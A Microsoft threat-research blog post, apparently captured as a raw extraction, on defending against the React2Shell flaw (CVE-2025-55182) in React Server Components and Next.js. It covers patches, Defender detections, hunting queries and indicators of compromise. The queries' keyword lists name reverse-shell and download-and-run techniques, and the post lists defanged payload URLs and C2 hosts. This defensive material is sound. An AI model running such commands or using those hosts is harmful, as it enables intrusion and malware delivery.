10d; DeviceProcessEvents | where Timestamp >= ago(lookback) | where InitiatingProcessFileName =~ \"node.exe\" and InitiatingProcessCommandLine has \".js\" | where FileName =~ \"cmd.exe\" | where (ProcessCommandLine has_any (@\"\\next\\\", @\"\\npm\\npm\\node_modules\\\", \"\\\\server.js\") and (ProcessCommandLine has_any (\"powershell -c \\\"\", \"curl\", \"wget\", \"echo $\", \"ipconfig\", \"start msiexec\", \"whoami\", \"systeminfo\", \"$env:USERPROFILE\", \"net user\", \"net group\", \"localgroup administrators\", \"-ssh\", \"set-MpPreference\", \"add-MpPreference\", \"rundll32\", \"certutil\", \"regsvr32\", \"bitsadmin\", \"mshta\", \"msbuild\") or (ProcessCommandLine has \"powershell\" and (ProcessCommandLine has_any (\"Invoke-Expression\", \"DownloadString\", \"DownloadFile\", \"FromBase64String\", \"Start-Process\", \"System.IO.Compression\", \"System.IO.MemoryStream\", \"iex \", \"iex(\", \"Invoke-WebRequest\", \"iwr \", \".UploadFile\", \"System.Net.WebClient\") or ProcessCommandLine matches regex @\"[-/\u2013][Ee^]{1,2}[NnCcOoDdEeMmAa^]*\\s[A-Za-z0-9+/=]{15,}\")))) or ProcessCommandLine matches regex @'cmd\\.exe\\s+/d\\s+/s\\s+/c\\s+\"powershell\\s+-c\\s+\"[0-9]+\\*[0-9]+\"\"' Identify execution of suspicious commands initiated by the next-server parent process post-exploitation let lookback = 10d; DeviceProcessEvents | where Timestamp >= ago(lookback) | where InitiatingProcessFileName == \"node\" | where InitiatingProcessCommandLine has_any (\" server.js\", \" start\", \"/server.js\") | where ProcessCommandLine has_any (\"| sh\", \"openssl,\", \"/dev/tcp/\", \"| bash\", \"|sh\", \"|bash\", \"bash,\", \"{sh,}\", \"SOCK_STREAM\", \"bash -i\", \"whoami\", \"| base64 -d\", \"chmod +x /tmp\", \"chmod 777\") | where ProcessCommandLine !contains \"vscode\" and ProcessCommandLine !contains \"/.claude/\" and ProcessCommandLine !contains \"/claude\" Microsoft Defender XDR\u2019s blast radius analysis capability, incorporated into the incident investigation view, allows security teams to visualize and understand the business impact of a security compromise by showing potential propagation paths towards the organization\u2019s critical assets before it escalates into a full blown incident. This capability merges pre-breach estate understanding with post-breach views allowing security teams to map their interconnected assets and highlights potential paths teams can prioritize for remediation efforts based on the criticality of assets and their interconnectivity to the compromised entities. Microsoft Defender for Cloud Microsoft Defender for Cloud customers can use security explorer templates to locate exposed containers running vulnerable container images and vulnerable virtual machines. Template titled Internet exposed containers running container images vulnerable to React2Shell vulnerability CVE-2025-55182 and Internet exposed virtual machines vulnerable to React2Shell vulnerability CVE-2025-55182 are added to the gallery. Figure 3. Microsoft Defender for Cloud security explorer templates related to CVE-2025-55182 Microsoft Security Exposure Management Microsoft Security Exposure Management\u2019s automated attack path analysis maps out potential threats by identifying exposed resources and tracing the routes an attacker might take to compromise critical assets. This analysis highlights vulnerable cloud compute resources, such as virtual machines and Kubernetes containers, that are susceptible to remote code execution vulnerabilities, including React2Shell CVEs. It also outlines possible lateral movement steps an adversary might take within the environment. The attack paths are presented for all supported cloud environments, including Azure, AWS, and GCP. To view these paths, filter the view in Microsoft Security Exposure Management, filter by entry point type: Kubernetes container Virtual Machine AWS EC2 instance GCP compute instance. Alternatively, in Microsoft Defender for Cloud, customers can filter by titles such as: Internet exposed container with high severity vulnerabilities Internet exposed Azure VM with RCE vulnerabilities Internet exposed GCP compute instance with RCE vulnerabilities Internet exposed AWS EC2 instance with RCE vulnerabilities Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace. Detect network IP and domain indicators of compromise using ASIM //IP list and domain list- _Im_NetworkSession let lookback = 30d; let ioc_ip_addr = dynamic([\"194.69.203.32\", \"162.215.170.26\", \"216.158.232.43\", \"196.251.100.191\", \"46.36.37.85\", \"92.246.87.48\"]); let ioc_domains = dynamic([\"anywherehost.site\", \"xpertclient.net\", \"superminecraft.net.br\", \"overcome-pmc-conferencing-books.trycloudflare.com\", \"donaldjtrmp.anondns.net\", \"labubu.anondns.net\", \"krebsec.anondns.net\", \"hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com\", \"ghostbin.axel.org\", \"194.69.203.32:81\", \"194.69.203.32:81\", \"194.69.203.32:81\", \"162.215.170.26:3000\", \"216.158.232.43:12000\", \"overcome-pmc-conferencing-books.trycloudflare.com\", \"donaldjtrmp.anondns.net:1488\", \"labubu.anondns.net:1488\", \"krebsec.anondns.net:2316/dong\", \"hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com\", \"ghostbin.axel.org\"]);n_Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now())n| where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains) | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor Detect Web Sessions IP and file hash indicators of compromise using ASIM //IP list - _Im_WebSession let lookback = 30d; let ioc_ip_addr = dynamic([\"194.69.203.32\", \"162.215.170.26\", \"216.158.232.43\", \"196.251.100.191\", \"46.36.37.85\", \"92.246.87.48\"]); let ioc_sha_hashes =dynamic([\"c2867570f3bbb71102373a94c7153239599478af84b9c81f2a0368de36f14a7c\", \"9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df717c849a1331\", \"b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d27909046e5e0f\", \"d60461b721c0ef7cfe5899f76672e4970d629bb51bb904a053987e0a0c48ee0f\", \"d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8f0b66629fe8a\", \"d71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b59630d8f3b4d\", \"b5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc870082335954bec8\", \"4cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0df0d3d5668a4d\", \"f347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf317e10c4068b\", \"661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e0aad73947fb1\", \"876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a9dde35ba8e13\", \"2ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083240afa3a6457\", \"f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b8e07beb854f7\", \"7e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f244bf271d2e5\"]);b_Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now())b| where DstIpAddr in (ioc_ip_addr) or FileSHA256 in (ioc_sha_hashes) | summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor Detect domain and URL indicators of compromise using ASIM // Domain list - _Im_WebSession let ioc_domains = dynamic([\"anywherehost.site\", \"xpertclient.net\", \"superminecraft.net.br\", \"overcome-pmc-conferencing-books.trycloudflare.com\", \"donaldjtrmp.anondns.net\", \"labubu.anondns.net\", \"krebsec.anondns.net\", \"hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com\", \"ghostbin.axel.org\", \"194.69.203.32:81\", \"194.69.203.32:81\", \"194.69.203.32:81\", \"162.215.170.26:3000\", \"216.158.232.43:12000\", \"overcome-pmc-conferencing-books.trycloudflare.com\", \"donaldjtrmp.anondns.net:1488\", \"labubu.anondns.net:1488\", \"krebsec.anondns.net:2316/dong\", \"hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com\", \"ghostbin.axel.org\"]); _Im_WebSession (url_has_any = ioc_domains) Detect files hashes indicators of compromise using ASIM // file hash list - imFileEvent let ioc_sha_hashes = dynamic([\"c2867570f3bbb71102373a94c7153239599478af84b9c81f2a0368de36f14a7c\", \"9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df717c849a1331\", \"b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d27909046e5e0f\", \"d60461b721c0ef7cfe5899f76672e4970d629bb51bb904a053987e0a0c48ee0f\", \"d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8f0b66629fe8a\", \"d71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b59630d8f3b4d\", \"b5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc870082335954bec8\", \"4cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0df0d3d5668a4d\", \"f347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf317e10c4068b\", \"661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e0aad73947fb1\", \"876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a9dde35ba8e13\", \"2ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083240afa3a6457\", \"f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b8e07beb854f7\", \"7e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f244bf271d2e5\"]);dimFileEventd| where SrcFileSHA256 in (ioc_sha_hashes) or TargetFileSHA256 in (ioc_sha_hashes) | extend AccountName = tostring(split(User, @'')[1]), AccountNTDomain = tostring(split(User, @'')[0]) | extend AlgorithmType = \"SHA256\" Find use of reverse shells This query looks for potential reverse shell activity initiated by cmd.exe or PowerShell . It matches the use of reverse shells in this attack: reverse-shell-nishang . Indicators of compromise The list below is non-exhaustive and does not represent all indicators of compromise observed in the known campaigns: Indicator Type Description c6c7e7dd85c0578dd7cb24b012a665a9d5210cce8ff735635a45605c3af1f6ad b568582240509227ff7e79b6dc73c933dcc3fae674e9244441066928b1ea0560 69f2789a539fc2867570f3bbb71102373a94c7153239599478af84b9c81f2a03 68de36f14a7c9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df 717c849a1331b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d2 7909046e5e0fd60461b721c0ef7cfe5899f76672e4970d629bb51bb904a05398 7e0a0c48ee0f65c72a252335f6dcd435dbd448fc0414b295f635372e1c5a9171 SHA-256 Coin miner payload hashes b33d468641a0d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8 f0b66629fe8ad71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b 59630d8f3b4db5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc8700 82335954bec84cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0d f0d3d5668a4df347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf 317e10c4068b661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e 0aad73947fb1876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a 9dde35ba8e132ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083 240afa3a6457f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b 8e07beb854f77e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f 244bf271d2e55cd737980322de37c2c2792154b4cf4e4893e9908c2819026e5f SHA-256 Backdoor payload hashes hxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.arc hxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.i686 hxxp://194[.]69[.]203[.]32:81/hiddenbink/react.sh hxxp://162[.]215[.]170[.]26:3000/sex.sh hxxp://216[.]158[.]232[.]43:12000/sex.sh hxxp://196[.]251[.]100[.]191/no_killer/Exodus.arm4 hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86 hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86_64 hxxp://196[.]251[.]100[.]191/update.sh hxxp://anywherehost[.]site/xms/k1.sh hxxp://anywherehost[.]site/xms/kill2.sh hxxps://overcome-pmc-conferencing-books[.]trycloudflare[.]com/p.png hxxp://donaldjtrmp.anondns.net:1488/labubu hxxp://labubu[.]anondns[.]net:1488/dong hxxp://krebsec[.]anondns[.]net:2316/dong hxxps://hybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]com/agent hxxps://ghostbin[.]axel[.]org/paste/evwgo/raw hxxp://xpertclient[.]net:3000/sex.sh hxxp://superminecraft[.]net[.]br:3000/sex.sh URLs Various payload download URLs 194.69.203[.]32 162.215.170[.]26 216.158.232[.]43 196.251.100[.]191 46.36.37[.]85 92.246.87[.]48 IP addresses C2 anywherehost[.]site xpertclient[.]net vps-zap812595-1[.]zap-srv[.]com superminecraft[.]net[.]br overcome-pmc-conferencing-books[.]trycloudflare[.]com donaldjtrmp[.]anondns[.]net labubu[.]anondns[.]net krebsec[.]anondns[.]net hybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]com ghostbin[.]axel[.]org Domains C2 References Critical Security Vulnerability in React Server Components \u2013 React NVD \u2013 CVE-2025-55182 CVE-2025-55182 (React2Shell) Opportunistic Exploitation In The Wild: What The GreyNoise Observation Grid Is Seeing So Far Learn more For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog . To get notified about new publications and to join discussions on social media, follow us on LinkedIn , X (formerly Twitter) , and Bluesky . To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast . The guidance provided in this blog post represents general best practices and is intended for informational purposes only. Customers remain responsible for evaluating and implementing security measures appropriate for their environments. Microsoft Defender Security Research Team See Microsoft Defender Security Research Team posts Related posts February 10 15 min read Manipulating AI memory for profit: The rise of AI Recommendation Poisoning That helpful \u201cSummarize with AI\u201d button? It might be secretly manipulating what your AI recommends. February 9 3 min read A one-prompt attack that breaks LLM safety alignment As LLMs and diffusion models power more applications, their safety alignment becomes critical. February 6 5 min read Analysis of active exploitation of SolarWinds Web Help Desk We are seeing exploitation of SolarWinds Web Help Desk via CVE\u20112025\u201140551 and CVE\u20112025\u201140536 that can lead to domain compromise; here is how to patch, hunt, and mitigate now. Get started with Microsoft Security Protect your people, data, and infrastructure with AI-powered, end-to-end security from Microsoft. Learn how Connect with us on social X YouTube LinkedIn What's new Surface Pro Surface Laptop Surface Laptop Studio 2 Copilot for organizations Copilot for personal use AI in Windows Explore Microsoft products Windows 11 apps Microsoft Store Account profile Download Center Microsoft Store support Returns Order tracking Certified Refurbished Microsoft Store Promise Flexible Payments Education Microsoft in education Devices for education Microsoft Teams for Education Microsoft 365 Education How to buy for your school Educator training and development Deals for students and parents AI for education Business Microsoft AI Microsoft Security Dynamics 365 Microsoft 365 Microsoft Power Platform Microsoft Teams Microsoft 365 Copilot Small Business Developer & IT Azure Microsoft Developer Microsoft Learn Support for AI marketplace apps Microsoft Tech Community Microsoft Marketplace Marketplace Rewards Visual Studio Company Careers About Microsoft Company news Privacy at Microsoft Investors Diversity and inclusion Accessibility Sustainability English (United States) Your Privacy Choices Opt-Out Icon Your Privacy Choices Consumer Health Privacy Sitemap Contact Microsoft Privacy Manage cookies Terms of use Trademarks Safety & eco Recycling About our ads \u00a9 Microsoft 2026",
    "filtered_content": "Skip to content Skip to main content Microsoft Microsoft Security Microsoft Security Microsoft Security Home Why Microsoft Security Solutions AI-powered cybersecurity Cloud security Data security & governance Identity & network access Privacy & risk management Security for AI Unified SecOps Zero Trust Products Product families Product families Microsoft Defender Microsoft Entra Microsoft Intune Microsoft Priva Microsoft Purview Microsoft Sentinel Security AI Security AI Microsoft Security Copilot Identity & access Identity & access Microsoft Entra ID (Azure Active Directory) Microsoft Entra Agent ID Microsoft Entra External ID Microsoft Entra ID Governance Microsoft Entra ID Protection Microsoft Entra Internet Access Microsoft Entra Private Access Microsoft Entra Permissions Management Microsoft Entra Verified ID Microsoft Entra Workload ID Microsoft Entra Domain Services Azure Key Vault SIEM & XDR SIEM & XDR Microsoft Sentinel Microsoft Defender for Cloud Microsoft Defender XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Defender for Identity Microsoft Defender for Cloud Apps Microsoft Security Exposure Management Microsoft Defender Vulnerability Management Microsoft Defender Threat Intelligence Cloud security Cloud security Microsoft Defender for Cloud Microsoft Defender Cloud Security Posture Mgmt Microsoft Defender External Attack Surface Management Azure Firewall Azure Web App Firewall Azure DDoS Protection GitHub Advanced Security Endpoint security & management Endpoint security & management Microsoft Defender for Endpoint Microsoft Defender XDR Microsoft Defender for Business Microsoft Intune core capabilities Microsoft Defender for IoT Microsoft Defender Vulnerability Management Microsoft Intune Advanced Analytics Microsoft Intune Endpoint Privilege Management\u200b Microsoft Intune Enterprise Application Management Microsoft Intune Remote Help Microsoft Cloud PKI Compliance & privacy Compliance & privacy Microsoft Purview Communication Compliance Microsoft Purview Compliance Manager Microsoft Purview Data Lifecycle Management Microsoft Purview eDiscovery Microsoft Purview Audit Microsoft Priva Risk Management Microsoft Priva Subject Rights Requests Data security & governance Data security & governance Microsoft Purview Information Protection Microsoft Purview Insider Risk Management Microsoft Purview Data Loss Prevention Microsoft Purview Data Governance Pricing Services Partners Resources Get started Get started Cybersecurity awareness Customer stories Security 101 Product trials How we protect Microsoft Reports and analysis Reports and analysis Industry recognition Microsoft Security Insider Microsoft Digital Defense Report Security Response Center Community Community Microsoft Security Blog Microsoft Security Events Microsoft Tech Community Documentation and training Documentation and training Documentation Technical Content Library Training & certifications Additional sites Additional sites Compliance Program for Microsoft Cloud Microsoft Trust Center Security Engineering Portal Service Trust Portal Microsoft Secure Future Initiative Business Solutions Hub Contact Sales Start free trial More All Microsoft Global Microsoft Security Azure Dynamics 365 Microsoft 365 Microsoft Teams Windows 365 Tech & innovation Tech & innovation Microsoft AI Azure Space Mixed reality Microsoft HoloLens Microsoft Viva Quantum computing Sustainability Industries Industries Education Automotive Financial services Government Healthcare Manufacturing Retail Partners Partners Find a partner Become a partner Partner Network Microsoft Marketplace Marketplace Rewards Software development companies Resources Resources Blog Microsoft Advertising Developer Center Documentation Events Licensing Microsoft Learn Microsoft Research View Sitemap Search Search Microsoft Security No results Cancel Home Defending against the CVE-2025-55182 (React2Shell) vulnerability in React Server Components Search Research December 15, 2025 16 min read Defending against the CVE-2025-55182 (React2Shell) vulnerability in React Server Components By Microsoft Defender Security Research Team Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Cloud Microsoft Defender for Endpoint Microsoft Defender Vulnerability Management Microsoft Defender XDR Microsoft Security Experts Microsoft Sentinel Topics Endpoint security Threat intelligence CVE-2025-55182 (also referred to as React2Shell and includes CVE-2025-66478, which was merged into it) is a critical pre-authentication remote code execution (RCE) vulnerability affecting React Server Components, Next.js, and related frameworks. With a CVSS score of 10.0, this vulnerability could allow attackers to execute arbitrary code on vulnerable servers through a single malicious HTTP request. Exploitation activity related to this vulnerability was detected as early as December 5, 2025. Most successful exploits originated from red team assessments; however, we also observed real-world exploitation attempts by threat actors delivering multiple subsequent payloads, majority of which are coin miners. Both Windows and Linux environments have been observed to be impacted. The React Server Components ecosystem is a collection of packages, frameworks, and bundlers that enable React 19 applications to run parts of their logic on the server rather than the browser. It uses the Flight protocol to communicate between client and server. When a client requests data, the server receives a payload, parses this payload, executes server-side logic, and returns a serialized component tree. The vulnerability exists because affected React Server Components versions fail to validate incoming payloads. This could allow attackers to inject malicious structures that React accepts as valid, leading to prototype pollution and remote code execution. This vulnerability presents a significant risk because of the following factors: Default configurations are vulnerable, requiring no special setup or developer error. Public proof-of-concept exploits are readily available with near-100% reliability. Exploitation can happen without any user authentication since this is a pre-authentication vulnerability. The vulnerability could be exploited using a single malicious HTTP request. In this report, Microsoft Defender researchers share insights from observed attacker activity exploiting this vulnerability. Detailed analyses, detection insights, as well as mitigation recommendations and hunting guidance are covered in the next sections. Further investigation towards providing stronger protection measures is in progress, and this report will be updated when more information becomes available. Analyzing CVE-2025-55182 exploitation activity React is widely adopted in enterprise environments. In Microsoft Defender telemetry, we see tens of thousands of distinct devices across several thousand organizations running some React or React-based applications. Some of the vulnerable applications are deployed inside containers, and the impact on the underlying host is dependent on the security configurations of the container . We identified several hundred machines across a diverse set of organizations compromised using common tactics, techniques, and procedures (TTPs) observed with web application RCE. To exploit CVE-2025-55182, an attacker sends a crafted input to a web application running React Server Components functions in the form of a POST request. This input is then processed as a serialized object and passed to the backend server, where it is deserialized. Due to the default trust among the components, the attacker-provided input is then deserialized and the backend runs attacker-provided code under the NodeJS runtime. Figure 1: Attack diagram depicting activity leading to action on objectives Post-exploitation, attackers were observed to run arbitrary commands, such as reverse shells to known Cobalt Strike servers. To achieve persistence, attackers added new malicious users, utilized remote monitoring and management (RMM) tools such as MeshAgent, modified authorized_keys file, and enabled root login. To evade security defenses, the attackers downloaded from attacker-controlled CloudFlare Tunnel endpoints (for example, *.trycloudflare.com ) and used bind mounts to hide malicious processes and artifacts from system monitoring tools. The malware payloads seen in campaigns investigated by Microsoft Defender vary from remote access trojans (RATs) like VShell and EtherRAT, the SNOWLIGHT memory-based malware downloader that enabled attackers to deploy more payloads to target environments, ShadowPAD, and XMRig cryptominers. The attacks proceeded by enumerating system details and environment variables to enable lateral movement and credential theft. Credentials that were observed to be targeted included Azure Instance Metadata Service (IMDS) endpoints for Azure, Amazon Web Services (AWS), Google Cloud Platform (GCP), and Tencent Cloud to acquire identity tokens, which could be used to move laterally to other cloud resources. Attackers also deployed secret discovery tools such as TruffleHog and Gitleaks, along with custom scripts to extract several different secrets. Attempts to harvest AI and cloud-native credentials, such as OpenAI API keys, Databricks tokens, and Kubernetes service\u2011account credentials were also observed. Azure Command-Line Interface (CLI) (az) and Azure Developer CLI (azd) were also used to obtain tokens. Figure 2: Example of reverse shell observed in one of the campaigns Mitigation and protection guidance Microsoft recommends customers to act on these mitigation recommendations: Manual identification guidance Until full in-product coverage is available, you can manually assess exposure on servers or containers: Navigate to your project directory and open the node_modules folder. Review installed packages and look for: react-server-dom-webpack react-server-dom-parcel react-server-dom-turbopack next Validate versions against the known affected range: React: 19.0.0,19.1.0, 19.1.1, 19.2.0 Next.js: 15.0.0 \u2013 15.0.4, 15.1.0 \u2013 15.1.8, 15.2.0 \u2013 15.2.5, 15.3.0 \u2013 15.3.5, 15.4.0 \u2013 15.4.7, 15.5.0 \u2013 15.5.6, 16.0.0 \u2013 16.0.6, 14.3.0-canary.77 and later canary releases If any of these packages match the affected versions, remediation is required. Prioritize internet-facing assets first, especially those identified by Defender as externally exposed. Mitigation best practices Patch immediately React and Next.js have released fixes for the impacted packages. Upgrade to one of the following patched versions (or later within the same release line): React: 19.0.1, 19.1.2, 19.2.1 Next.js: 5.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7 Because many frameworks and bundlers rely on these packages, make sure your framework-level updates also pull in the corrected dependencies. Prioritize exposed services Patch all affected systems, starting with internet-facing workloads. Use Microsoft Defender Vulnerability Management (MDVM) to surface vulnerable package inventory and to track remediation progress across your estate. Monitor for exploit activity Review MDVM dashboards and Defender alerts for indicators of attempted exploitation. Correlate endpoint, container, and cloud signals for higher confidence triage. Invoke incident response process to address any related suspicious activity stemming from this vulnerability. Add WAF protections where appropriate Apply Azure Web Application Firewall (WAF) custom rules for Application Gateway and Application Gateway for Containers to help block exploit patterns while patching is in progress. Microsoft has published rule guidance and JSON examples in the Azure Network Security Blog, with ongoing updates as new attack permutations are identified. Recommended customer action checklist Identify affected React Server Components packages in your applications and images. Upgrade to patched versions. Refer to the React page for patching guidance. Prioritize internet-facing services for emergency change windows. Enable and monitor Defender alerts tied to React Server Components exploitation attempts. Apply Azure WAF custom rules as a compensating control where feasible. Use MDVM to validate coverage and confirm risk reduction post-update. CVE-2025-55182 represents a high-impact, low-friction attack path against modern React Server Components deployments. Rapid patching combined with layered Defender monitoring and WAF protections provides the strongest short-term and long-term risk reduction strategy. Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence. Tactic Observed activity Microsoft Defender coverage Initial Access /Execution Suspicious process launched by Node Microsoft Defender for Endpoint \u2013 Possible exploitation of React Server Components vulnerability (2 detectors) Microsoft Defender Antivirus \u2013 HackTool:Linux/SuspNodeActivity.A \u2013 HackTool:Linux/SuspNodeActivity.B \u2013 Behavior:Linux/SuspNodeActivity.B \u2013 Trojan:JS/CVE-2025-55182.A \u2013 Trojan:VBS/CVE-2025-55182.DA!MTB Execution Execution of suspicious commands initiated by the next-server parent process to probe for command execution capabilities. Microsoft Defender for Cloud \u2013 Potential React2Shell command injection detected on a Kubernetes cluster \u2013 Potential React2Shell command injection detected on Azure App Service Microsoft Defender for Endpoint \u2013 Suspicious process executed by a network service \u2013 Suspicious Node.js script execution \u2013 Suspicious Node.js process behavior In many cases subsequent activity post exploitation was detected and following alerts were triggered on the victim devices. Note that the following alerts below can also be triggered by unrelated threat activity. Tactic Observed activity Microsoft Defender coverage Execution Suspicious downloads, encoded execution, anomalous service/process creation, and behaviors indicative of a reverse shell and crypto-mining Microsoft Defender for Endpoint \u2013 Suspicious PowerShell download or encoded command execution \u2013 Possible reverse shell \u2013 Suspicious service launched \u2013 Suspicious anonymous process created using memfd_create \u2013 Possible cryptocurrency miner Defense Evasion Unauthorized code execution through process manipulation, abnormal DLL loading, and misuse of legitimate system tools Microsoft Defender for Endpoint \u2013 A process was injected with potentially malicious code \u2013 An executable file loaded an unexpected DLL file \u2013 Use of living-off-the-land binary to run malicious code Credential Access Unauthorized use of Kerberos tickets to impersonate accounts and gain unauthorized access Microsoft Defender for Endpoint \u2013 Pass-the-ticket attack Credential Access Suspicious access to sensitive files such as cloud and GIT credentials Microsoft Defender for Cloud \u2013 Possible secret reconnaissance detected Lateral movement Attacker activity observed in multiple environments Microsoft Defender for Endpoint \u2013 Hands-on-keyboard attack involving multiple devices Automatic attack disruption through Microsoft Defender for Endpoint alerts To better support customers in the event of exploitation, we are expanding our detection framework to identify and alert on CVE-2025-55182 activity across all operating systems for Microsoft Defender for Endpoint customers. These detections are integrated with automatic attack disruption . When these alerts, combined with other signals, provide high confidence of active attacker behavior, automatic attack disruption can initiate autonomous containment actions to help stop the attack and prevent further progression. Microsoft Defender Vulnerability Management and Microsoft Defender for Cloud Microsoft Defender for Cloud rolled out support to surface CVE-2025-55182 with agentless scanning across containers and cloud virtual machines (VMs). Follow the documentation on how to enable agentless scanning: Protect your servers with Defender for Servers Defender for Containers Deployment Overview Microsoft Defender Vulnerability Management (MDVM) can surface impacted Windows, Linux, and macOS devices. In addition, MDVM and Microsoft Defender for Cloud dashboards can surface: Identification of exposed assets in the organization Clear remediation guidance tied to your affected assets and workloads Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following prebuilt promptbooks to automate incident response or investigation tasks related to this threat: Incident investigation Microsoft User analysis Threat actor profile Threat Intelligence 360 report based on MDTI article Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel. Threat intelligence reports Microsoft Defender XDR customers can use the following threat analytics reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender XDR threat analytics Vulnerability Profile: CVE-2025-55182 \u2013 React Server Components Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Hunting queries and recommendations Microsoft Defender XDR Microsoft Defender XDR customers can run the following query to find related activity in their networks: Detect potential React2Shell command injection attempt CloudAuditEvents | where (ProcessCommandLine == \"/bin/sh -c (whoami)\" and (ParentProcessName == \"node\" or ParentProcessName has \"next-server\")) or (ProcessCommandLine has_any (\"echo\",\"powershell\") and ProcessCommandLine matches regex @'(echo\\s+\\$\\(\\(\\d+\\*\\d+\\)\\)|powershell\\s+-c\\s+\"\\d+\\*\\d+\")') | project Timestamp, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, FileName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Identify encoded PowerShell attempts let lookback = 10d; DeviceProcessEvents | where Timestamp >= ago(lookback) | where InitiatingProcessParentFileName has \"node\" | where InitiatingProcessCommandLine has_any (\"next start\", \"next-server\") or ProcessCommandLine has_any (\"next start\", \"next-server\") | summarize make_set(InitiatingProcessCommandLine), make_set(ProcessCommandLine) by DeviceId, Timestamp //looking for powershell activity | where set_ProcessCommandLine has_any (\"cmd.exe\",\"powershell\") | extend decoded_powershell_1 = replace_string(tostring(base64_decode_tostring(tostring(split(tostring(split(set_ProcessCommandLine.[0],\"EncodedCommand \",1).[0]),'\"',0).[0]))),\"\\0\",\"\") | extend decoded_powershell_1b = replace_string(tostring(base64_decode_tostring(tostring(split(tostring(split(set_ProcessCommandLine.[0],\"Enc \",1).[0]),'\"',0).[0]))),\"\\0\",\"\") | extend decoded_powershell_2 = replace_string(tostring(base64_decode_tostring(tostring(split(tostring(split(set_ProcessCommandLine.[0],\"enc \",1).[0]),'\"',0).[0]))),\"\\0\",\"\") | extend decoded_powershell_3 = replace_string(tostring(base64_decode_tostring(tostring(split(tostring(split(set_ProcessCommandLine.[0],\"ec \",1).[0]),'\"',0).[0]))),\"\\0\",\"\") | where set_ProcessCommandLine !has 